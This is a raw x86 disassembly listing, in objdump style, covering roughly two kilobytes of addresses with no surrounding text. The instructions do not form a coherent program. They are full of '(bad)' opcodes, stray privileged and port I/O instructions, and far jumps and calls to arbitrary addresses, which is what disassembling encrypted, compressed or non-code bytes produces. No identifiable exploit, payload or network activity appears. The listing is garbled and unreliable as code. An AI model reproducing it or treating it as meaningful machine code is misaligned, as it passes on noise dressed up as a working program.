  41daa7:	push   ebp
  41daa8:	dec    ebx
  41daa9:	sub    eax,DWORD PTR [ebx+0x2da58d0b]
  41daaf:	pushf  
  41dab0:	dec    ebp
  41dab1:	and    DWORD PTR gs:[ebp+0x6e],eax
  41dab5:	or     eax,DWORD PTR [eax+0x20bd9424]
  41dabb:	xchg   esi,eax
  41dabc:	jl     0x41da94
  41dabe:	ins    BYTE PTR es:[edi],dx
  41dabf:	xchg   ebx,eax
  41dac0:	jg     0x41daf2
  41dac2:	addr16 jmp 0x9a7e4df1
  41dac8:	ret    
  41dac9:	pop    ecx
  41daca:	fs adc eax,0xa6dfd1c3
  41dad0:	scas   al,BYTE PTR es:[edi]
  41dad1:	sti    
  41dad2:	iret   
  41dad3:	and    BYTE PTR [esi],bl
  41dad5:	dec    eax
  41dad6:	jmp    0xed45b906
  41dadb:	dec    DWORD PTR [ecx+0x4c]
  41dade:	nop
  41dadf:	push   eax
  41dae0:	xchg   edx,eax
  41dae1:	xchg   dl,ah
  41dae3:	and    BYTE PTR [ebp+0x2c],0x4c
  41dae7:	push   cs
  41dae8:	lods   eax,DWORD PTR ds:[esi]
  41dae9:	test   al,0xe0
  41daeb:	cmp    BYTE PTR [ebx+eiz*4],ch
  41daee:	jo     0x41db6f
  41daf0:	add    bh,0xfd
  41daf3:	out    dx,eax
  41daf4:	inc    ecx
  41daf5:	(bad)  
  41daf6:	retf   0xa01b
  41daf9:	jmp    0xac97:0xb02cb56f
  41db00:	int    0xde
  41db02:	sbb    ecx,eax
  41db04:	or     dl,ch
  41db06:	out    0xb2,eax
  41db08:	add    ah,0x1b
  41db0b:	paddw  mm2,mm7
  41db0e:	call   0xd0b3:0xe5b4fdb1
  41db15:	jae    0x41db5a
  41db17:	pop    edi
  41db18:	push   es
  41db19:	push   eax
  41db1a:	push   cs
  41db1b:	sub    cl,BYTE PTR [esi+0x7a66e1c6]
  41db21:	stos   DWORD PTR es:[edi],eax
  41db22:	clc    
  41db23:	in     eax,dx
  41db24:	leave  
  41db25:	jno    0x41db90
  41db27:	pop    ebx
  41db28:	dec    esi
  41db29:	jbe    0x41dad1
  41db2b:	jl     0x41dba7
  41db2d:	push   0xfef6de45
  41db32:	rol    esp,cl
  41db34:	mov    eax,0xfb1b15bc
  41db39:	pop    esp
  41db3a:	test   eax,0xae9377c9
  41db3f:	enter  0x2a36,0x42
  41db43:	and    bh,BYTE PTR [esi+0x6ead1248]
  41db49:	sub    al,0x6e
  41db4b:	or     al,0xd2
  41db4d:	daa    
  41db4e:	test   ecx,ecx
  41db50:	mov    al,0x72
  41db52:	lock sbb BYTE PTR [edx+0x338aee4f],dh
  41db59:	ret    
  41db5a:	cmc    
  41db5b:	add    eax,0x242004b8
  41db60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db61:	or     BYTE PTR [ebp-0x7],bl
  41db64:	inc    ecx
  41db65:	stc    
  41db66:	sub    edx,eax
  41db68:	mov    bl,0x41
  41db6a:	jne    0x41db9f
  41db6c:	cmp    BYTE PTR [eax],0x69
  41db6f:	jge    0x41db7e
  41db71:	lock adc eax,0x61d3b792
  41db77:	daa    
  41db78:	loop   0x41db77
  41db7a:	jl     0x41db2d
  41db7c:	xchg   edx,eax
  41db7d:	jg     0x41db51
  41db7f:	push   ds
  41db80:	pop    esp
  41db81:	es jbe 0x41db7d
  41db84:	and    esp,DWORD PTR [edi]
  41db86:	sbb    eax,0x55299d4a
  41db8b:	adc    edi,eax
  41db8d:	add    edx,DWORD PTR [eax+0x1c]
  41db90:	(bad)  
  41db91:	out    dx,eax
  41db92:	clc    
  41db93:	cwde   
  41db94:	aad    0xcc
  41db96:	sbb    bh,bh
  41db98:	push   ds
  41db99:	add    eax,0xc4aeb119
  41db9e:	sub    ecx,DWORD PTR [ecx]
  41dba0:	lock ins BYTE PTR es:[edi],dx
  41dba2:	das    
  41dba3:	xchg   DWORD PTR ds:0x3f9a5d89,ecx
  41dba9:	scas   al,BYTE PTR es:[edi]
  41dbaa:	jae    0x41db30
  41dbac:	in     al,0x2d
  41dbae:	and    eax,0xdffe3921
  41dbb3:	jmp    0x704a:0x41a03e9a
  41dbba:	pop    ds
  41dbbb:	lods   eax,DWORD PTR ds:[esi]
  41dbbc:	or     edx,edx
  41dbbe:	es cdq 
  41dbc0:	adc    al,0x4a
  41dbc2:	lds    ecx,FWORD PTR [edx-0x534a1a8e]
  41dbc8:	call   0xfd27:0xa9027fbc
  41dbcf:	bound  ecx,QWORD PTR [edx+0x52]
  41dbd2:	inc    ecx
  41dbd3:	std    
  41dbd4:	les    edx,FWORD PTR [esp+eax*2-0xf]
  41dbd8:	ret    
  41dbd9:	adc    edi,DWORD PTR [eax]
  41dbdb:	shr    eax,1
  41dbdd:	loop   0x41dc13
  41dbdf:	mov    al,0x55
  41dbe1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbe2:	sti    
  41dbe3:	iret   
  41dbe4:	jg     0x41dbbf
  41dbe6:	mov    BYTE PTR [ebx],dl
  41dbe8:	xor    al,0x92
  41dbea:	mov    dh,0x27
  41dbec:	xchg   DWORD PTR [edx+eiz*1],edx
  41dbef:	pop    esp
  41dbf0:	jp     0x41dbc2
  41dbf2:	test   al,0xf2
  41dbf4:	sbb    dh,BYTE PTR [edx-0x5c445e5d]
  41dbfa:	loopne 0x41dc52
  41dbfc:	cld    
  41dbfd:	aas    
  41dbfe:	xchg   edx,eax
  41dbff:	loop   0x41dbdb
  41dc01:	mov    cl,0xbc
  41dc03:	idiv   DWORD PTR [ecx-0x4a]
  41dc06:	push   esi
  41dc07:	or     cl,BYTE PTR [edx-0xf]
  41dc0a:	sbb    al,0x2f
  41dc0c:	push   edi
  41dc0d:	mov    edi,DWORD PTR [edx-0x64]
  41dc10:	(bad)  
  41dc11:	in     eax,dx
  41dc12:	sub    al,0x23
  41dc14:	test   ecx,ecx
  41dc16:	xchg   BYTE PTR [edx-0x8],ah
  41dc19:	adc    eax,0x37950c58
  41dc1e:	icebp  
  41dc1f:	je     0x41dbf2
  41dc21:	push   eax
  41dc22:	retf   
  41dc23:	test   DWORD PTR [edi],esi
  41dc25:	arpl   WORD PTR [edx],sp
  41dc27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc28:	pop    ebp
  41dc29:	cwde   
  41dc2a:	and    ah,ah
  41dc2c:	loop   0x41dc78
  41dc2e:	adc    edx,ebp
  41dc30:	int    0xe2
  41dc32:	cdq    
  41dc33:	jp     0x41dc4a
  41dc35:	pop    ebp
  41dc36:	lds    ebx,FWORD PTR [edx]
  41dc38:	jge    0x41dc4f
  41dc3a:	sbb    dh,dh
  41dc3c:	and    ah,BYTE PTR [ebp+0x24]
  41dc3f:	das    
  41dc40:	rcr    BYTE PTR [ebp-0xf],1
  41dc43:	pop    esi
  41dc44:	mov    edi,DWORD PTR [ebx]
  41dc46:	jmp    0xf016:0x25a60db0
  41dc4d:	imul   esi,DWORD PTR [edx],0x6cdebaa4
  41dc53:	addr16 call 0xf17e616d
  41dc59:	into   
  41dc5a:	imul   eax,DWORD PTR [edi],0x7c
  41dc5d:	loopne 0x41dc0b
  41dc5f:	(bad)  
  41dc60:	adc    esp,esp
  41dc62:	mov    bh,0xa0
  41dc64:	out    0x78,al
  41dc66:	(bad)  
  41dc67:	push   esi
  41dc68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc69:	cmp    BYTE PTR [esi-0x1b],ch
  41dc6c:	adc    eax,0xfe948e39
  41dc71:	inc    esp
  41dc72:	mov    ch,0xfa
  41dc74:	jo     0x41dccf
  41dc76:	rcr    BYTE PTR [esi],cl
  41dc78:	(bad)  
  41dc79:	out    0xba,al
  41dc7b:	jl     0x41dc55
  41dc7d:	jae    0x41dcf7
  41dc7f:	add    eax,0xd869529c
  41dc84:	dec    esp
  41dc85:	mov    esi,0x257908ca
  41dc8a:	outs   dx,DWORD PTR ds:[esi]
  41dc8b:	cmp    eax,0x6265ffc3
  41dc90:	outs   dx,BYTE PTR ds:[esi]
  41dc91:	push   ebp
  41dc92:	and    DWORD PTR [edi-0x43],esp
  41dc95:	mov    edi,0x61299464
	...
  41dd12:	add    BYTE PTR [eax],al
  41dd14:	popa   
  41dd15:	push   0xffffffe9
  41dd17:	pop    ss
  41dd18:	jmp    0x41dcb1
  41dd1a:	(bad)  
  41dd1b:	jle    0x41dd23
  41dd1d:	js     0x41dccc
  41dd1f:	aam    0x22
  41dd21:	jmp    0x795d66b3
  41dd26:	add    DWORD PTR [eax],eax
  41dd28:	outs   dx,BYTE PTR ds:[esi]
  41dd29:	pop    es
  41dd2a:	add    BYTE PTR [eax],al
  41dd2c:	xchg   edi,eax
  41dd2d:	sbb    edi,DWORD PTR [edx]
  41dd2f:	push   ss
  41dd30:	or     BYTE PTR [ecx+ebx*2-0x6c040a94],ah
  41dd37:	mov    ds:0x8e16878,eax
  41dd3c:	ret    
  41dd3d:	call   0xa816:0x37e5fb89
  41dd44:	into   
  41dd45:	pusha  
  41dd46:	pushf  
  41dd47:	jo     0x41dd5b
  41dd49:	inc    ebx
  41dd4a:	or     edx,esp
  41dd4c:	push   ds
  41dd4d:	mov    es,ebp
  41dd4f:	fild   QWORD PTR [ebp-0x4e0b2ac7]
  41dd55:	jle    0x41dd67
  41dd57:	int    0x4b
  41dd59:	add    al,BYTE PTR [esi+0x68e8acfe]
  41dd5f:	mov    bl,0x95
  41dd61:	lds    ecx,FWORD PTR [edx+0x33]
  41dd64:	push   eax
  41dd65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd66:	and    bl,BYTE PTR [ebp+0x4a]
  41dd69:	jns    0x41ddb9
  41dd6b:	popf   
  41dd6c:	neg    BYTE PTR [edx+0x1c]
  41dd6f:	jp     0x41dd32
  41dd71:	dec    eax
  41dd72:	xchg   ah,bh
  41dd74:	jno    0x41dd5f
  41dd76:	ret    0x67cb
  41dd79:	push   0xffffffc9
  41dd7b:	xchg   esi,eax
  41dd7c:	fstp   DWORD PTR ds:0x9d1a4818
  41dd82:	jmp    0x9051995
  41dd87:	(bad)  
  41dd88:	mov    bl,0x1d
  41dd8a:	and    BYTE PTR [eax+0x4c],cl
  41dd8d:	aam    0x6e
  41dd8f:	icebp  
  41dd90:	lods   al,BYTE PTR ds:[esi]
  41dd91:	fs pop ss
  41dd93:	scas   al,BYTE PTR es:[edi]
  41dd94:	jecxz  0x41ddaa
  41dd96:	je     0x41dd81
  41dd98:	lods   al,BYTE PTR ds:[esi]
  41dd99:	in     eax,0xdf
  41dd9b:	jno    0x41dd4a
  41dd9d:	call   0xabbf:0x1479cc90
  41dda4:	fdivr  QWORD PTR [esi+0x259eb156]
  41ddaa:	push   esi
  41ddab:	rcr    DWORD PTR [ecx-0x6a],cl
  41ddae:	imul   eax,DWORD PTR [ebp+0x40],0x13
  41ddb2:	cli    
  41ddb3:	xor    eax,0x470568ad
  41ddb8:	inc    ecx
  41ddb9:	dec    ecx
  41ddba:	or     bh,BYTE PTR [edx]
  41ddbc:	stos   DWORD PTR es:[edi],eax
  41ddbd:	xor    esp,DWORD PTR [ebp-0x533875b8]
  41ddc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddc4:	cld    
  41ddc5:	cmc    
  41ddc6:	das    
  41ddc7:	jo     0x41ddb3
  41ddc9:	jle    0x41dd7c
  41ddcb:	call   0xc568f57
  41ddd0:	popf   
  41ddd1:	outs   dx,DWORD PTR ds:[esi]
  41ddd2:	xchg   esi,eax
  41ddd3:	sub    DWORD PTR [ecx-0x5f],0x7e8fb470
  41ddda:	cmp    DWORD PTR [ebp+eiz*2+0x95383f6],edi
  41dde1:	bound  esp,QWORD PTR [eax-0x6e75bdd2]
  41dde7:	push   ss
  41dde8:	sub    dh,BYTE PTR [eax+0x3]
  41ddeb:	jle    0x41de66
  41dded:	and    esi,0x6277115b
  41ddf3:	or     ebx,DWORD PTR [esi+0x22]
  41ddf6:	test   eax,0xef64b4ef
  41ddfb:	dec    eax
  41ddfc:	xor    DWORD PTR [eax],0xffffffc6
  41ddff:	adc    cl,cl
  41de01:	inc    eax
  41de02:	ja     0x41dddb
  41de04:	sar    DWORD PTR [ebp+0x73],cl
  41de07:	or     ah,BYTE PTR [eax-0xf60f41c]
  41de0d:	outs   dx,BYTE PTR ds:[esi]
  41de0e:	and    DWORD PTR ds:0xfadf7dd3,edi
  41de14:	jb     0x41de92
  41de16:	push   cs
  41de17:	push   eax
  41de18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de19:	sub    al,0x42
  41de1b:	popf   
  41de1c:	data16 test BYTE PTR [eax-0xb10ffad],cl
  41de23:	mov    cl,0x71
  41de25:	push   esi
  41de26:	adc    eax,DWORD PTR [eax-0x58f983ce]
  41de2c:	add    ecx,DWORD PTR [ecx-0x68bec402]
  41de32:	jbe    0x41de09
  41de34:	adc    al,BYTE PTR [ebx-0x11]
  41de37:	retf   
  41de38:	int3   
  41de39:	mov    ebx,0x73c8d4f1
  41de3e:	ins    BYTE PTR es:[edi],dx
  41de3f:	jecxz  0x41de4e
  41de41:	xor    ch,BYTE PTR [ebx-0x3e]
  41de44:	call   0xc3b3dafe
  41de49:	and    BYTE PTR [ebx],al
  41de4b:	add    eax,0x69581312
  41de50:	xchg   edx,eax
  41de51:	lock movnti DWORD PTR [esi-0x61],ecx
  41de56:	add    edi,DWORD PTR [ebp-0x2d1a41ce]
  41de5c:	push   0x7c
  41de5e:	aam    0x6a
  41de60:	lods   al,BYTE PTR ds:[esi]
  41de61:	mov    ds:0xe5d2168e,eax
  41de66:	push   ss
  41de67:	xchg   edx,eax
  41de68:	mov    ebx,0x1e58ee47
  41de6d:	jecxz  0x41de3f
  41de6f:	ret    0x3424
  41de72:	jge    0x41dea6
  41de74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de75:	xchg   ecx,eax
  41de76:	lahf   
  41de77:	sub    esi,edx
  41de79:	mov    dl,0x23
  41de7b:	ds into 
  41de7d:	scas   eax,DWORD PTR es:[edi]
  41de7e:	xlat   BYTE PTR ds:[ebx]
  41de7f:	aas    
  41de80:	test   DWORD PTR [ecx+0x34],esp
  41de83:	pop    edi
  41de84:	cli    
  41de85:	inc    ecx
  41de86:	call   0x37c1:0xdb950146
  41de8d:	dec    esi
  41de8e:	lock test eax,0x5d7b6fb5
  41de94:	mov    bl,0x67
  41de96:	mov    ds:0xdb1af6c0,al
  41de9b:	addr16 fwait
  41de9d:	mov    eax,esp
  41de9f:	popa   
  41dea0:	and    al,0x2d
  41dea2:	cwde   
  41dea3:	(bad)  
  41dea4:	and    BYTE PTR [bp+di-0x72],ah
  41dea8:	pop    ebp
  41dea9:	outs   dx,DWORD PTR ds:[esi]
  41deaa:	std    
  41deab:	pop    edi
  41deac:	ins    BYTE PTR es:[edi],dx
  41dead:	aas    
  41deae:	or     ebp,esp
  41deb0:	or     BYTE PTR [eax],ah
  41deb2:	mov    ds:0x16acb146,eax
  41deb7:	jge    0x41de4e
  41deb9:	pop    edx
  41deba:	lea    ebx,[edi-0x75b0a18d]
  41dec0:	mov    ebx,0x3e86e6d
  41dec5:	cmp    DWORD PTR [edx-0x59],ebx
  41dec8:	mov    al,0x25
  41deca:	fild   DWORD PTR [edx-0x4e]
  41decd:	call   0x80a2ee6e
  41ded2:	sbb    DWORD PTR [edx+0x420f4411],edi
  41ded8:	test   al,0x1d
  41deda:	mov    dh,0xd9
  41dedc:	xor    al,0xd2
  41dede:	popa   
  41dedf:	jmp    0xdcb8:0x4f522c08
  41dee6:	fidiv  DWORD PTR fs:[edx+0x179f47ad]
  41deed:	inc    ebp
  41deee:	js     0x41df50
  41def0:	pop    eax
  41def1:	ja     0x41df4e
  41def3:	bound  esi,QWORD PTR [ecx]
  41def5:	ins    DWORD PTR es:[edi],dx
  41def6:	sbb    eax,0xa115af07
  41defb:	js     0x41def6
  41defd:	add    eax,0x93691c9
  41df02:	aaa    
  41df03:	dec    ecx
  41df04:	loope  0x41df1d
  41df06:	mov    esi,0x2fe787e7
  41df0b:	and    eax,0x6dbf311c
  41df10:	adc    eax,0x6f1a5ec8
  41df15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df16:	inc    edx
  41df17:	push   es
  41df18:	sub    ebp,DWORD PTR [edi]
  41df1a:	inc    esp
  41df1b:	sti    
  41df1c:	jmp    0xd0ed5813
  41df21:	out    dx,eax
  41df22:	xor    eax,0x24a09d36
  41df27:	xchg   edx,eax
  41df28:	xor    ebp,esi
  41df2a:	sbb    bl,BYTE PTR [eax+0x52]
  41df2d:	ja     0x41df03
  41df2f:	sub    ah,BYTE PTR [eax]
  41df31:	call   0xbe51e80b
  41df36:	enter  0x6b66,0x53
  41df3a:	fist   WORD PTR [eax+0x40]
  41df3d:	cwde   
  41df3e:	mov    cl,0xd7
  41df40:	push   ebx
  41df41:	in     eax,dx
  41df42:	ds out dx,al
  41df44:	mov    es,WORD PTR [esi+0x30]
  41df47:	outs   dx,BYTE PTR ds:[esi]
  41df48:	stc    
  41df49:	inc    edi
  41df4a:	cmc    
  41df4b:	fisubr DWORD PTR [edx+0x3f9a7f1c]
  41df51:	in     eax,dx
  41df52:	xor    BYTE PTR [edi],0xa0
  41df55:	nop
  41df56:	inc    ebx
  41df57:	or     BYTE PTR [ebp-0x7e36bec8],al
  41df5d:	dec    ebx
  41df5e:	mov    esp,0xedb87dbb
  41df63:	mov    ebx,0xdf96669a
  41df68:	jmp    FWORD PTR [edx]
  41df6a:	ret    0x7d9a
  41df6d:	jmp    0x790c29ea
  41df72:	sub    esi,DWORD PTR [eax+eax*2+0x1f9324d1]
  41df79:	sub    bh,BYTE PTR [eax]
  41df7b:	cmp    dl,BYTE PTR gs:[eax+ecx*1+0x40cf1a1c]
  41df83:	ins    DWORD PTR es:[edi],dx
  41df84:	sti    
  41df85:	dec    edx
  41df86:	sbb    ecx,ebp
  41df88:	mov    cl,0xe8
  41df8a:	mov    ds,WORD PTR [ebp-0x3a3bfe2a]
  41df90:	sbb    BYTE PTR [eax],dl
  41df92:	popf   
  41df93:	test   al,0x2d
  41df95:	push   eax
  41df96:	adc    eax,0xabd7669b
  41df9b:	dec    ebx
  41df9c:	sub    eax,esp
  41df9e:	bound  edi,QWORD PTR [ecx+0x2032cdf7]
  41dfa4:	mov    al,0xe5
  41dfa6:	cs dec esp
  41dfa8:	jbe    0x41dfab
  41dfaa:	mov    al,0xdb
  41dfac:	adc    bh,BYTE PTR [edi-0xd]
  41dfaf:	sti    
  41dfb0:	in     al,dx
  41dfb1:	(bad)  
  41dfb2:	cmp    al,BYTE PTR [edi]
  41dfb4:	ds jmp 0x41df74
  41dfb7:	test   eax,0x71a3b7eb
  41dfbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfbd:	and    DWORD PTR [edi+0x4],esi
  41dfc0:	and    cl,al
  41dfc2:	cld    
  41dfc3:	mov    eax,0x29dd4ed7
  41dfc8:	mov    al,ds:0xfa79de29
  41dfcd:	mov    ch,0x86
  41dfcf:	jecxz  0x41e001
  41dfd1:	imul   edx,DWORD PTR [ecx],0xd3448d2c
  41dfd7:	sub    ebp,DWORD PTR [edx+0x1857f190]
  41dfdd:	cdq    
  41dfde:	sub    DWORD PTR [edi-0x46],esp
  41dfe1:	out    0xb4,eax
  41dfe3:	daa    
  41dfe4:	mov    dh,0x7e
  41dfe6:	hlt    
  41dfe7:	mov    ds:0x85f0d77b,al
  41dfec:	cmp    eax,0xd2b1ae5f
  41dff1:	jge    0x41e00c
  41dff3:	cmp    edx,ebx
  41dff5:	push   ss
  41dff6:	sub    eax,0xe0aee154
  41dffb:	out    dx,al
  41dffc:	xor    dl,BYTE PTR [edx-0xa]
  41dfff:	jbe    0x41dfb9
  41e001:	call   0x35371ec4
  41e006:	(bad)  
  41e008:	mov    bl,0x8c
  41e00a:	aad    0x63
  41e00c:	call   0x5ad9:0x61315b22
  41e013:	mov    dh,0x18
  41e015:	stos   DWORD PTR es:[edi],eax
  41e016:	mov    al,0x82
  41e018:	pop    edi
  41e019:	sub    eax,0xc245da9
  41e01e:	out    0xa1,eax
  41e020:	inc    esp
  41e021:	and    dh,bl
  41e023:	ds and BYTE PTR ds:[ebp-0x51],ch
  41e028:	in     al,dx
  41e029:	mov    eax,0x8dd30709
  41e02e:	push   ebp
  41e02f:	add    eax,0x920578e8
  41e034:	inc    esi
  41e035:	imul   eax,DWORD PTR [edi+0x7f0383ad],0x35297f8c
  41e03f:	mov    edi,esi
  41e041:	les    ebp,FWORD PTR [eax-0x7b]
  41e044:	adc    eax,0x8c80afc5
  41e049:	add    BYTE PTR [esi+0x7bda2b09],dh
  41e04f:	xor    dh,cl
  41e051:	pop    esi
  41e052:	cmp    eax,0x1b6b8ffd
  41e057:	int3   
  41e058:	ss rol ecx,1
  41e05b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e05c:	jno    0x41e08c
  41e05e:	jae    0x41e053
  41e060:	or     eax,esp
  41e062:	stos   DWORD PTR es:[edi],eax
  41e063:	cs stos BYTE PTR es:[edi],al
  41e065:	push   cs
  41e066:	xchg   edi,eax
  41e067:	mov    BYTE PTR [ebp+0xa52bd73],bh
  41e06d:	push   eax
  41e06e:	mov    esi,0xbb7593cd
  41e073:	jge    0x41e0f1
  41e075:	xchg   ecx,eax
  41e076:	icebp  
  41e077:	pop    esp
  41e078:	push   ds
  41e079:	leave  
  41e07a:	xor    bh,BYTE PTR [ebp+0x4b9118e3]
  41e080:	adc    al,0x44
  41e082:	jne    0x41e08b
  41e084:	xor    ebp,DWORD PTR [edi-0x61]
  41e087:	inc    ebx
  41e088:	mov    esp,0x98b92d59
  41e08d:	mov    BYTE PTR ds:0x73413ef5,0x23
  41e094:	jle    0x41e017
  41e096:	jmp    0x5aec:0x4da8c21f
  41e09d:	aaa    
  41e09e:	dec    ecx
  41e09f:	call   0xc8e2043c
  41e0a4:	dec    eax
  41e0a5:	add    ebx,DWORD PTR [ecx+0x40f6e4b0]
  41e0ab:	or     DWORD PTR [edx],edx
  41e0ad:	shr    BYTE PTR [esi+0x5],1
  41e0b0:	pop    es
  41e0b1:	aas    
  41e0b2:	nop
  41e0b3:	sbb    dl,BYTE PTR [edx+0x6880d2f5]
  41e0b9:	les    edi,FWORD PTR [ecx-0xc]
  41e0bc:	int3   
  41e0bd:	outs   dx,BYTE PTR ds:[esi]
  41e0be:	add    ecx,edx
  41e0c0:	imul   ebx,DWORD PTR [ecx+ecx*8-0xb206c9c],0x4aa1bf42
  41e0cb:	lock std 
  41e0cd:	test   eax,0x4d356441
  41e0d2:	pop    ecx
  41e0d3:	mov    ebp,esi
  41e0d5:	nop
  41e0d6:	sbb    eax,DWORD PTR [ecx-0x234c3246]
  41e0dc:	or     ch,BYTE PTR [ebp-0x2c0dbf19]
  41e0e2:	sub    DWORD PTR [ebx-0x2d],esi
  41e0e5:	mov    esp,0xd6c12ea5
  41e0ea:	cmp    edi,0xffffffff
  41e0ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0ee:	inc    eax
  41e0ef:	ins    BYTE PTR es:[edi],dx
  41e0f0:	jle    0x41e16f
  41e0f2:	sub    ecx,DWORD PTR [edi-0x2c]
  41e0f5:	sahf   
  41e0f6:	enter  0x7401,0x1c
  41e0fa:	shl    BYTE PTR [edi-0xa],0x78
  41e0fe:	sbb    eax,0xb92042e0
  41e103:	fsubr  QWORD PTR [esp+edi*2+0x3b]
  41e107:	mov    esi,0x97b75642
  41e10c:	int3   
  41e10d:	je     0x41e153
  41e10f:	call   DWORD PTR [ecx-0x18]
  41e112:	push   esp
  41e113:	into   
  41e114:	ret    
  41e115:	in     al,dx
  41e116:	pop    es
  41e117:	adc    BYTE PTR [ebp+ecx*4+0x43],cl
  41e11b:	push   eax
  41e11c:	mov    esi,DWORD PTR [ebx+0x6654199f]
  41e122:	pop    ds
  41e123:	mov    edx,ds
  41e125:	xor    BYTE PTR [edx],cl
  41e127:	fcomp  st(1)
  41e129:	aad    0xcc
  41e12b:	sti    
  41e12c:	adc    DWORD PTR [eax+0x7b],ebx
  41e12f:	std    
  41e130:	xchg   ebp,eax
  41e131:	sbb    BYTE PTR [esp+edx*2-0x6b709ea9],0xf4
  41e139:	sbb    al,0x71
  41e13b:	jb     0x41e1a3
  41e13d:	hlt    
  41e13e:	inc    ebp
  41e13f:	adc    al,0x59
  41e141:	mov    DWORD PTR [ebx-0x7fea853],edi
  41e147:	jmp    0x319a3c46
  41e14c:	cmp    BYTE PTR [edx],ch
  41e14e:	jl     0x41e0f8
  41e150:	sbb    eax,0x754318e8
  41e155:	leave  
  41e156:	push   ebx
  41e157:	gs jge 0x41e184
  41e15a:	sub    BYTE PTR [ebp+0x6e],dh
  41e15d:	inc    eax
  41e15e:	stc    
  41e15f:	sub    al,0xc0
  41e161:	test   BYTE PTR ds:0xabeb058,al
  41e167:	cmp    ch,ch
  41e169:	push   ss
  41e16a:	and    BYTE PTR [esi-0x64],ah
  41e16d:	test   eax,0xe1661e2e
  41e172:	inc    esi
  41e173:	pop    esp
  41e174:	sub    al,0xf8
  41e176:	das    
  41e177:	cmp    BYTE PTR [esi+0x713b0997],bh
  41e17d:	data16 or al,0x62
  41e180:	pop    ss
  41e181:	xlat   BYTE PTR ds:[ebx]
  41e182:	imul   esp,DWORD PTR [edx],0x3b
  41e185:	jp     0x41e16d
  41e187:	cmp    DWORD PTR [eax+esi*8],eax
  41e18a:	sbb    eax,0xd53ab633
  41e18f:	push   0xf436e071
  41e194:	ins    DWORD PTR es:[edi],dx
  41e195:	rcr    ebx,0x1
  41e198:	clc    
  41e199:	cdq    
  41e19a:	cmc    
  41e19b:	shl    DWORD PTR [ebx-0x50],cl
  41e19e:	shl    dl,cl
  41e1a0:	push   0x55335cd7
  41e1a5:	popf   
  41e1a6:	daa    
  41e1a7:	pop    eax
  41e1a8:	xchg   ebx,eax
  41e1a9:	les    eax,FWORD PTR [esi-0x4aae7b1d]
  41e1af:	out    0x50,eax
  41e1b1:	(bad)  [ebx-0x61d2bf23]
  41e1b7:	sub    al,0x2d
  41e1b9:	in     al,0x10
  41e1bb:	pop    ebp
  41e1bc:	jne    0x41e1a4
  41e1be:	inc    ecx
  41e1bf:	dec    ebx
  41e1c0:	xor    BYTE PTR [edi+0x5],ch
  41e1c3:	out    dx,eax
  41e1c4:	cmp    BYTE PTR [edi],ch
  41e1c6:	dec    BYTE PTR [edi+0x49]
  41e1c9:	mov    bh,0x4a
  41e1cb:	popa   
  41e1cc:	(bad)  
  41e1cd:	jmp    0x41e1f9
  41e1cf:	ja     0x41e21d
  41e1d1:	int    0x83
  41e1d3:	(bad)  
  41e1d4:	cmp    cl,bh
  41e1d6:	mov    bh,0xb0
  41e1d8:	scas   eax,DWORD PTR es:[edi]
  41e1d9:	ret    
  41e1da:	sub    cl,BYTE PTR [esi+0x443c5f1d]
  41e1e0:	cmp    DWORD PTR [ebp-0x5728520c],esp
  41e1e6:	and    eax,0xd18657b9
  41e1eb:	xor    al,0x13
  41e1ed:	call   0xf253:0x91cb79ef
  41e1f4:	jl     0x41e178
  41e1f6:	dec    ebx
  41e1f7:	or     cl,BYTE PTR [edx-0x7a]
  41e1fa:	mov    dl,0xe0
  41e1fc:	inc    ebp
  41e1fd:	cs call 0x707fb3a3
  41e203:	mov    ds:0x9c1ecf4d,al
  41e208:	daa    
  41e209:	mov    ch,0xc9
  41e20b:	jo     0x41e212
  41e20d:	or     edi,ebp
  41e20f:	mov    eax,ds:0x2c21b122
  41e214:	mov    DWORD PTR [edi+esi*1],ecx
  41e217:	es and eax,0x98e6cc79
  41e21d:	pop    ebp
  41e21e:	dec    ebx
  41e21f:	popa   
  41e220:	push   ds
  41e221:	loop   0x41e1d4
  41e223:	pop    esp
  41e224:	and    BYTE PTR gs:[esi-0x1fcf402d],ch
  41e22b:	add    DWORD PTR [esi-0x4abb1a50],edi
  41e231:	scas   al,BYTE PTR es:[edi]
  41e232:	aad    0x7a
  41e234:	div    BYTE PTR [edx+0x7b]
  41e237:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e238:	push   edx
  41e239:	inc    edi
  41e23a:	or     al,0x82
  41e23c:	and    DWORD PTR [edx+0x58],ecx
  41e23f:	(bad)  
  41e240:	mov    ebx,0x7edfdc4e
  41e245:	div    bh
  41e247:	repz in al,0xf5
  41e24a:	or     esi,DWORD PTR [edi]
  41e24c:	out    dx,al
  41e24d:	int    0x71
  41e24f:	aas    
  41e250:	xchg   esi,eax
  41e251:	dec    ecx
  41e252:	lods   al,BYTE PTR ds:[esi]
  41e253:	sbb    ah,BYTE PTR [esi-0xe]
  41e256:	imul   ebp,DWORD PTR [ecx-0x7e],0x55
  41e25a:	in     eax,0x18
  41e25c:	dec    ecx
  41e25d:	xchg   ebp,eax
  41e25e:	inc    eax
  41e25f:	add    al,0x91
  41e261:	push   ss
  41e262:	add    eax,0xd105ab4c
  41e267:	clc    
  41e268:	cmp    BYTE PTR [ecx],bh
  41e26a:	xchg   esi,eax
  41e26b:	lock rol DWORD PTR [eax-0x5dcbc3ed],1
  41e272:	les    esp,FWORD PTR [esi]
  41e274:	push   edx
  41e275:	outs   dx,DWORD PTR ds:[esi]
  41e276:	repnz mov esp,0x5e03cf36
  41e27c:	pop    edi
  41e27d:	sahf   
  41e27e:	addr16 jb 0x41e227
  41e281:	mov    edi,0x5ea4d33f
  41e286:	add    cl,BYTE PTR [edi]
  41e288:	aas    
  41e289:	dec    ebp
  41e28a:	cmp    DWORD PTR [edx],0x72
  41e28d:	push   es
  41e28e:	(bad)  
  41e290:	enter  0x3c7e,0xda
